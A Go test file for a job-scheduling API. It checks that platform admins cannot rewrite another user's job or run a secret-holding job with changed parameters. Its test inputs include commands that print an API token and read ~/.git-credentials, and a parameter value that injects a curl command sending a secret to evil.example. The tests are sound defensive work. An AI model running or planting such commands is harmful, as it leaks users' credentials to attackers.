package jobs_test

import (
	"context"
	"fmt"
	"net/http"
	"testing"

	"github.com/nebari-dev/javo/internal/gateway/apitest"
	"github.com/nebari-dev/javo/internal/reasons"
)

// A platform admin cannot change what someone else's job runs, whatever it
// holds: not its command on a template without tokens, and not by moving it
// onto a template that gives its runs the owner's API token in the same
// request (the guard used to read only the job's current template).
func TestOnlyTheOwnerChangesWhatAJobRuns(t *testing.T) {
	t.Parallel()
	tpl := apitest.JobTemplateObj()
	tpl.Name, tpl.Spec.APIToken = "agent-jobs", true
	f := apitest.JobFixture(t, apitest.Options{}, tpl, apitest.JobObj(apitest.AliceID, "nightly"))
	root := f.Session("root-cccccccc", "javo-admins")
	for _, body := range []string{
		`{"displayName":"nightly","template":"agent-jobs","engine":"command","command":"sh -c 'echo $JAVO_TOKEN'"}`,
		`{"displayName":"nightly","template":"lab","engine":"command","command":"sh -c 'cat ~/.git-credentials'"}`,
	} {
		w := f.Do("PUT", "/api/jobs/nightly?owner="+apitest.AliceID, body, root)
		if w.Code != http.StatusForbidden || apitest.Decode[apitest.Problem](t, w).Title != reasons.Msg(reasons.MsgRewriteOwnerOnly) {
			t.Fatalf("admin rewrite %s: %d %s", body, w.Code, w.Body)
		}
	}
	got, err := f.Db.Jobs().GetByOwnerName(context.Background(), apitest.AliceID, "nightly")
	if err != nil {
		t.Fatal(err)
	}
	if got.Spec.Template != "lab" || got.Spec.Engine != "papermill" {
		t.Fatalf("stored template %s engine %s", got.Spec.Template, got.Spec.Engine)
	}
}

// A run with other parameter values hands code that may build commands from
// them the job's secrets, so on a job that holds credentials only its owner
// picks them: a platform admin (and the job's own token) may run it only as
// saved.
func TestOnlyTheOwnerRunsASecretHoldingJobWithOtherValues(t *testing.T) {
	t.Parallel()
	f := apitest.JobFixture(t, apitest.Options{})
	f.WithSecretKeys()
	alice := f.Session(apitest.AliceID)
	root := f.Session("root-cccccccc", "javo-admins")
	f.CreateSecret(alice, "ALICE_KEY", apitest.SecretValue)
	params := `,"parameters":[{"name":"region","type":"string","default":"emea"}]`
	if w := f.Do("POST", "/api/jobs", fmt.Sprintf(apitest.NewJob, params+`,"env":[{"name":"K","secret":"ALICE_KEY"}]`), alice); w.Code != http.StatusCreated {
		t.Fatalf("create: %d %s", w.Code, w.Body)
	}
	owner := "?owner=" + apitest.AliceID
	w := f.Do("POST", "/api/jobs/nightly-sales/run"+owner, `{"parameters":{"region":"'; curl https://evil.example -d $K; '"}}`, root)
	if w.Code != http.StatusForbidden || apitest.Decode[apitest.Problem](t, w).Title != reasons.Msg(reasons.MsgSecretsHeldOwnerOnly) {
		t.Fatalf("admin run with other values: %d %s", w.Code, w.Body)
	}
	if w := f.Do("POST", "/api/jobs/nightly-sales/run"+owner, `{"parameters":{"region":"emea"}}`, root); w.Code != http.StatusCreated {
		t.Fatalf("admin run with the saved values: %d %s", w.Code, w.Body)
	}
	if w := f.Do("POST", "/api/jobs/nightly-sales/run"+owner, "", root); w.Code != http.StatusCreated {
		t.Fatalf("admin run as saved: %d %s", w.Code, w.Body)
	}
	if w := f.Do("POST", "/api/jobs/nightly-sales/run", `{"parameters":{"region":"apac"}}`, alice); w.Code != http.StatusCreated {
		t.Fatalf("owner run with other values: %d %s", w.Code, w.Body)
	}
}
